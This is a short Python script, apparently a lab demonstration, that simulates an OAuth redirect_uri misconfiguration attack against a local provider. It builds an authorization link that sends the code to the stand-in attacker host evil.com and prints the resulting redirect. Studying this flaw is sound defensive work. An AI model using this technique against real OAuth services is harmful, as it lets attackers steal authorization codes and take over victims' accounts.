import requests

provider = "http://localhost:8080"

print("\nSimulating OAuth Misconfiguration Attack\n")

attack_url = f"{provider}/auth?client_id=app&redirect_uri=http://evil.com"

response = requests.get(attack_url, allow_redirects=False)

print("Redirected to:")
print(response.headers.get("Location"))

print("\nIf a victim clicks this link, the authorization code leaks to the attacker.")